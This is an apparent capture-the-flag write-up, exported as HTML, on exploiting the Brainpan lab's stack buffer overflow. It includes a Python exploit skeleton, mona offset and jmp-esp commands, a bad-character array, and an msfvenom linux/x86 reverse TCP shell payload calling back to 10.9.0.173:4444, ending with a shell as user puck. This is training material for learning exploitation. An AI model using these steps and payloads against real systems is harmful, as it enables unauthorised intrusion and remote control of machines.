@@ -1,0 +1,739 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Brainpan</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-interactiveBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="3d58ed54-12ad-475a-90ac-c2be7ec6d557" class="page sans"><header><h1 class="page-title">Brainpan</h1><p class="page-description"></p></header><div class="page-body"><figure id="95b56b5b-6abc-48fc-ac91-2edd4c364d15" class="image"><a href="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled.png"><img style="width:609px" src="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled.png"/></a></figure><figure id="36ba2043-1926-42c7-9c28-4c505ce6642c" class="image"><a href="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%201.png"><img style="width:375px" src="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%201.png"/></a></figure><p id="b2850621-5d30-46b6-a4ef-975420634f1a" class="">
+</p><p id="ec69a144-08a8-4d2e-94aa-50ef68cd8db1" class="">Enumerating the http service and we get</p><figure id="0c89912b-2707-448c-8a17-fdd0f7ccb444" class="image"><a href="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%202.png"><img style="width:394px" src="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%202.png"/></a></figure><figure id="0790b49f-e27d-433c-aba4-89158fc64cc6" class="image"><a href="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%203.png"><img style="width:553px" src="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%203.png"/></a></figure><p id="df65a62a-e123-490e-beae-8f6a29f09ed7" class="">We can see that it runs on port 9999 with this in mind lets start debugger, import the file and let it run. Testing to see where it crashes, I started at 600:</p><p id="dac772e7-bb8e-47e6-8f5c-ca89282cce20" class="">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600</p><figure id="cfdef3f0-5667-4746-89ee-e04b481a9d28" class="image"><a href="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%204.png"><img style="width:625px" src="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%204.png"/></a></figure><figure id="e605322c-b584-4bd2-8115-ab2111980aa8" class="image"><a href="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%205.png"><img style="width:381px" src="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%205.png"/></a></figure><p id="9ee6c055-79df-42eb-b761-68d9395618e7" class="">Crashed it successfully!</p><p id="2207d79e-5b9e-478b-99b3-0610c22c11ca" class="">
+</p><p id="74cc8498-2b04-4d0e-9503-a796f20e9258" class="">The next step is finding the EIP offset, we do this by running the command</p><p id="f376d2cd-194b-40fa-bb9b-5fb237ba3891" class="">!mona findmsp -distance 600</p><figure id="1fe41256-e6c4-4262-8723-760ca44abc58" class="image"><a href="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%206.png"><img style="width:454px" src="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%206.png"/></a></figure><p id="198dbe00-4212-4cbd-88e6-f9a8563a8e0d" class="">The offset is 524</p><p id="24407aeb-37a7-42a4-9e0e-a08742286d9a" class="">
+</p><p id="e96fd15c-7895-4002-bd85-82fb963cf605" class="">Lets create an exploit script:</p><pre id="1edb685e-5d37-4ea0-abaa-d42866b8eb72" class="code code-wrap"><code>#!/usr/bin/python
+
+import socket,sys
+
+address = &#x27;127.0.0.1&#x27;
+port = 9999
+
+offset = 524
+overflow = &quot;A&quot; * offset
+retn = &quot;BBBB&quot;
+padding = &quot;&quot;
+payload = &quot;&quot;
+postfix = &quot;&quot;
+
+buffer = overflow + retn + padding + payload + postfix
+
+try:
+print &#x27;[+] Sending buffer&#x27;
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((address,port))
+s.recv(1024)
+s.send(buffer + &#x27;\r\n&#x27;)
+except:
+print &#x27;[!] Unable to connect to the application.&#x27;
+sys.exit(0)
+finally:
+s.close()</code></pre><p id="f612dd33-d5b2-40c5-be78-aee02354d059" class="">The script is from the link below, I just tinkered the variables a little bit so it will be easier on my part:</p><figure id="28fc93c1-40ba-4c5d-88fb-4680da54501c"><a href="https://github.com/gh0x0st/Buffer_Overflow" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">GitHub - gh0x0st/Buffer_Overflow: Don&#x27;t let buffer overflows overflow your mind</div><div class="bookmark-description">A common hesitation when stepping into the Penetration Testing with Kali (PWK) course is the section on buffer overflow (BOF) exploits. This course does not expect you to do any advanced exploit writing, but does teach and sets the expectation that you&#x27;ll understand the basics by the time you sit for the exam and if you&#x27;re coming into this green, then you may feel a bit intimidated.</div></div><div class="bookmark-href"><img src="https://github.com/favicon.ico" class="icon bookmark-icon"/>https://github.com/gh0x0st/Buffer_Overflow</div></div><img src="https://opengraph.githubassets.com/f6f826fe76c1e72a6395dc90e0d4b205b8f5d91e27be71ad06795dc8b8ebf91c/gh0x0st/Buffer_Overflow" class="bookmark-image"/></a></figure><p id="09e75efb-b8a3-454d-b720-ccd3aa0d69ee" class="">
+</p><p id="13cbf315-5c8e-4c66-a300-56476e3af5d8" class="">Testing this and we successfully overwrite the EIP, all that&#x27;s left is to find the bad characters</p><figure id="4e16d30e-3ec2-4da5-aaf9-6f3f784a5753" class="image"><a href="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%207.png"><img style="width:254px" src="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%207.png"/></a></figure><p id="65c432d3-8343-4b63-9041-998fa73e87c2" class="">
+</p><p id="e92c2a59-0d97-4a12-af11-bb87f1fd1bee" class="">Google the strings of bad chars and put it on the exploit script under the variable payload</p><p id="073f39f9-2c91-4d99-88e2-314b6a4b2a93" class="">payload = (
+b&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f&quot;
+b&quot;\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;
+b&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f&quot;
+b&quot;\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f&quot;
+b&quot;\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f&quot;
+b&quot;\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;
+b&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f&quot;
+b&quot;\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;
+b&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f&quot;
+b&quot;\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;
+b&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf&quot;
+b&quot;\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;
+b&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf&quot;
+b&quot;\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;
+b&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef&quot;
+b&quot;\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;
+)</p><p id="fb3167bb-2d99-421a-82b2-c82bc3a904f5" class="">
+</p><p id="0027a408-9ef2-4002-bb4e-ca800d548812" class="">Restart and run the exploit command, take note of the ESP because we will need it later</p><figure id="60e83d75-14c8-4fd8-9964-b44580d10d32" class="image"><a href="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%208.png"><img style="width:134px" src="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%208.png"/></a></figure><p id="a02bc3a8-d63b-4964-95a6-2acd4067eced" class="">!mona compare -f bytearray.bin -a &lt;address&gt;</p><p id="0eb55e29-c0b5-4649-8508-5dd771e0ef26" class="">
+</p><p id="03e36cf7-9e41-4dc4-9a96-a50033278c48" class="">Replace the &lt;address&gt; with the ESP value and run the command</p><figure id="4de9cfc9-c014-432b-bb12-a4e49c85c99d" class="image"><a href="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%209.png"><img style="width:289px" src="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%209.png"/></a></figure><p id="1dcc9e8a-01e9-4260-adaa-39bb39f34fa1" class="">This is great , it means that only \x00 is the bad char, now we can move on to the next part</p><p id="25f2b41a-06a1-4331-a9ab-87aedb0e21a9" class="">
+</p><p id="f72d05e3-4c8d-4efb-9bd2-e5f0f2c60001" class="">Run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):</p><p id="396e901d-1604-4ce6-b2df-0702c605e7ff" class="">!mona jmp -r esp -cpb &quot;\x00&quot;</p><p id="3570f510-eef7-4733-93ce-a0ecff73ee4f" class="">
+</p><p id="4d65633a-caef-4fd5-a56c-61c13366256f" class="">Since \x00 is the only bad char we can run it as is</p><figure id="d4b782d1-0033-48ea-b7de-ef13707a90d1" class="image"><a href="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%2010.png"><img style="width:440px" src="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%2010.png"/></a></figure><p id="c262dcfa-e3c9-48f1-a983-c66c1a9aa3a4" class="">
+</p><p id="ea37edfa-0dd2-49e3-849b-d45f4ead558f" class="">Choose an address and update your <a href="http://exploit.py/">exploit.py</a> script, setting the &quot;retn&quot; variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.</p><figure id="5e45d99f-6af3-4b1d-bf14-d4652d6718fe" class="image"><a href="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%2011.png"><img style="width:278px" src="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%2011.png"/></a></figure><p id="8b07e107-5de2-4ac5-87a0-cd590a3e601f" class="">
+</p><p id="92583a12-4a95-4fc6-b350-cd7cff93de48" class="">Generating payload:</p><p id="0fcb8ecd-e7a7-451e-9178-9a8d438f6755" class="">
+</p><p id="609fede4-4872-4899-9feb-3cdf16f4d44a" class="">Put all the bad chars you identified in -b &quot;&quot; below, in our case it is only \x00 :</p><p id="96cce264-5bbf-42fd-8496-1ff69e1418f6" class="">
+</p><p id="f40bfbe4-b28a-48f0-a8cd-7bf3ab2509f8" class="">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.9.0.173 LPORT=4444 EXITFUNC=thread -b &quot;\x00&quot; -f c</p><p id="24039d91-d98b-4f4d-90df-8613e1984cfa" class="">
+</p><p id="b720d94f-9ab5-407c-9264-c6f0899f61c0" class="">Put it in the payload variable and set the padding to </p><p id="9aa3af74-51ef-46ae-ae93-9fba6ebc460a" class="">padding = &quot;\x90&quot; * 16</p><figure id="1d0f933e-910e-49f5-b478-0fc4d62abfa5" class="image"><a href="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%2012.png"><img style="width:524px" src="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%2012.png"/></a></figure><p id="73bd4413-3e6d-413e-a503-c93517e2efd2" class="">Restart debugger and run the exploit</p><p id="1ee0a498-3584-4090-b728-d399c294f695" class="">And we got a shell! I tested it first on my machine now lets put the address of the server on the exploit:</p><figure id="8897de16-7ff3-4fb7-bdf9-b360486a35c4" class="image"><a href="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%2013.png"><img style="width:216px" src="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%2013.png"/></a></figure><figure id="b60d3cd0-9d13-4255-bb6a-8f2e3a7b08b0" class="image"><a href="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%2014.png"><img style="width:466px" src="Brainpan%203d58ed5412ad475a90acc2be7ec6d557/Untitled%2014.png"/></a></figure><p id="dd145e06-f121-4530-beff-8d549d58b9ae" class="">We are in as user puck</p><p id="0e2a019c-20a9-478a-a321-7e92131e6e5e" class="">
